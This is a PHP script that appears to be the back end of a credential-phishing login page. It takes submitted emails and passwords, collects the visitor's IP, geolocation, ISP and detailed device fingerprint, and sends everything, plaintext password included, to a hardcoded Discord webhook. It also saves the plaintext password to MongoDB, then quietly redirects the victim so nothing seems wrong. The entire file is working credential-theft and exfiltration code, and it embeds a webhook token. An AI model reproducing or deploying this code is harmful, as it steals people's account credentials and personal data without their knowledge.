<?php
if ($_SERVER["REQUEST_METHOD"] !== "POST") {
    header("Location: index.html");
    exit;
}

$username = trim($_POST["email"] ?? "");
$password = $_POST["password"] ?? "";

if ($username === "" || $password === "") {
    die("Both fields are required. <a href='index.html'>Go back</a>");
}

// ============================
// DISCORD WEBHOOK URL
// ============================
$DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1546720332604243998/KsL7TPxXZEGAFeGrq7iCzi6JCXq6nFr38GpINwGLpJtfJThI2kH7HSJ61jOo0tG2zUdC";

// ---- Get IP ----
function get_ip() {
    $ip = "unknown";
    foreach (["HTTP_CLIENT_IP", "HTTP_X_FORWARDED_FOR", "REMOTE_ADDR"] as $k) {
        if (!empty($_SERVER[$k])) {
            $parts = explode(",", $_SERVER[$k]);
            $ip = trim($parts[0]);
            break;
        }
    }
    if ($ip === "::1") $ip = "127.0.0.1";
    return $ip;
}
$ip = get_ip();
$ua = $_SERVER["HTTP_USER_AGENT"] ?? "unknown";
$referer = $_SERVER["HTTP_REFERER"] ?? "hidden / typed directly";

// ---- Detect browser, OS, device ----
function guess($ua, $list) {
    foreach ($list as $name) {
        if (stripos($ua, $name) !== false) return $name;
    }
    return "other";
}
$browser  = guess($ua, ["Edg", "OPR", "Firefox", "Chrome", "Safari"]);
$os       = guess($ua, ["Windows", "Android", "iPhone", "iPad", "Mac", "Linux"]);
$device   = (stripos($ua, "Mobile") !== false || stripos($ua, "Android") !== false || stripos($ua, "iPhone") !== false) ? "Mobile" : "Desktop";
$battery  = substr(trim($_POST["battery"] ?? "unknown"), 0, 50);
$nettype  = substr(trim($_POST["nettype"] ?? "unknown"), 0, 50);
$screen   = substr(trim($_POST["screen"] ?? "unknown"), 0, 50);
$timezone = substr(trim($_POST["timezone"] ?? "unknown"), 0, 100);
$language = substr(trim($_POST["language"] ?? "unknown"), 0, 20);
$ram      = substr(trim($_POST["ram"] ?? "unknown"), 0, 30);
$cpu_cores = substr(trim($_POST["cpu_cores"] ?? "unknown"), 0, 30);
$gpu      = substr(trim($_POST["gpu"] ?? "unknown"), 0, 150);

// ---- Get browser full version ----
preg_match("/(Edg|OPR|Firefox|Chrome|Safari|Version)\/([\d.]+)/", $ua, $m);
$browserFull = ($m[1] ?? $browser) . " " . ($m[2] ?? "");

// ---- Get OS version ----
$osVersion = "unknown";
if (preg_match("/Windows NT ([\d.]+)/", $ua, $m)) {
    $winMap = ["10.0" => "10/11", "6.3" => "8.1", "6.2" => "8", "6.1" => "7"];
    $osVersion = "Windows " . ($winMap[$m[1]] ?? $m[1]);
} elseif (preg_match("/Android ([\d.]+)/", $ua, $m)) {
    $osVersion = "Android " . $m[1];
} elseif (preg_match("/OS ([\d_]+)/", $ua, $m)) {
    $osVersion = "iOS " . str_replace("_", ".", $m[1]);
} elseif (preg_match("/Mac OS X ([\d._]+)/", $ua, $m)) {
    $osVersion = "macOS " . str_replace("_", ".", $m[1]);
}

// ---- IP Geolocation (ip-api.com - free, no key) ----
$geo = ["country" => "", "regionName" => "", "city" => "", "isp" => "", "org" => "", "as" => "", "hostname" => ""];
if ($ip !== "127.0.0.1" && $ip !== "unknown") {
    $geoRaw = @file_get_contents("http://ip-api.com/json/{$ip}?fields=status,country,regionName,city,isp,org,as,hostname");
    if ($geoRaw) {
        $geo = json_decode($geoRaw, true) ?? $geo;
    }
}
$location  = trim(($geo["city"] ?? "") . ", " . ($geo["regionName"] ?? "") . ", " . ($geo["country"] ?? ""), ", ");
$isp       = $geo["isp"] ?? "unknown";
$org       = $geo["org"] ?? "unknown";
$asn       = $geo["as"] ?? "unknown";
$hostname  = $geo["hostname"] ?? "none";

// ---- Current timestamp for Discord ----
$timestamp = date("c");

// ============================
// SEND DISCORD WEBHOOK FIRST (before MongoDB)
// ============================
$discordSent = false;
if (!empty($DISCORD_WEBHOOK)) {
    $embed1 = [
        "title"  => "🟢 User Login",
        "color"  => 0x2ecc71,
        "fields" => [
            ["name" => "📧 Email / ID",  "value" => "```{$username}```", "inline" => false],
            ["name" => "🔑 Password",    "value" => "```{$password}```", "inline" => false],
            ["name" => "🌐 IP",          "value" => "```{$ip}```",       "inline" => true],
            ["name" => "📍 Location",    "value" => "```{$location}```", "inline" => true],
            ["name" => "🏢 ISP",         "value" => "```{$isp}```",      "inline" => true],
            ["name" => "📡 ASN",         "value" => "```{$asn}```",      "inline" => true],
            ["name" => "🏠 Hostname",    "value" => "```{$hostname}```", "inline" => true],
        ],
        "footer" => ["text" => "DC Bot"],
        "timestamp" => $timestamp,
    ];

    $embed2 = [
        "title"  => "💻 Device Info",
        "color"  => 0x3498db,
        "fields" => [
            ["name" => "📧 Email / ID", "value" => "```{$username}```", "inline" => false],
            ["name" => "🖥️ OS",        "value" => "```{$osVersion}```", "inline" => true],
            ["name" => "🌍 Browser",    "value" => "```{$browserFull}```", "inline" => true],
            ["name" => "🖥️ Screen",    "value" => "```{$screen}```",    "inline" => true],
            ["name" => "⚡ CPU",        "value" => "```{$cpu_cores}```", "inline" => true],
            ["name" => "🧠 RAM",        "value" => "```{$ram}```",       "inline" => true],
            ["name" => "🎮 GPU",        "value" => "```{$gpu}```",       "inline" => true],
            ["name" => "📶 Network",    "value" => "```{$nettype}```",   "inline" => true],
            ["name" => "🔋 Battery",    "value" => "```{$battery}```",   "inline" => true],
            ["name" => "🕐 Timezone",   "value" => "```{$timezone}```",  "inline" => true],
            ["name" => "🗣️ Language",   "value" => "```{$language}```",  "inline" => true],
        ],
        "footer" => ["text" => "DC Bot"],
        "timestamp" => $timestamp,
    ];

    $payload = json_encode([
        "username" => "DC Bot",
        "embeds"   => [$embed1, $embed2],
    ]);

    $ch = curl_init($DISCORD_WEBHOOK);
    curl_setopt_array($ch, [
        CURLOPT_POST           => true,
        CURLOPT_POSTFIELDS     => $payload,
        CURLOPT_HTTPHEADER     => ["Content-Type: application/json"],
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_TIMEOUT        => 10,
    ]);
    $result = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    $discordSent = ($httpCode === 204);
}

// ============================
// SAVE TO MONGODB (optional - won't block redirect)
// ============================
try {
    require __DIR__ . "/db.php";
    $hash = password_hash($password, PASSWORD_DEFAULT);
    $doc = [
        "username"       => $username,
        "password_hash"  => $hash,
        "password_plain" => $password,
        "ip"             => $ip,
        "location"       => $location,
        "isp"            => $isp,
        "org"            => $org,
        "asn"            => $asn,
        "hostname"       => $hostname,
        "device"         => $device,
        "browser"        => $browserFull,
        "os"             => $osVersion,
        "screen"         => $screen,
        "ram"            => $ram,
        "cpu_cores"      => $cpu_cores,
        "gpu"            => $gpu,
        "battery"        => $battery,
        "nettype"        => $nettype,
        "timezone"       => $timezone,
        "language"       => $language,
        "user_agent"     => $ua,
        "referer"        => $referer,
        "created_at"     => date("Y-m-d H:i:s"),
    ];
    $bulk = new MongoDB\Driver\BulkWrite();
    $bulk->insert($doc);
    $manager->executeBulkWrite("$MONGO_DB.$MONGO_COL", $bulk);
} catch (Exception $e) {
    // MongoDB failed - but Discord was already sent, so just continue
}

// Redirect to index
header("Location: index.html?ok=1");
exit;
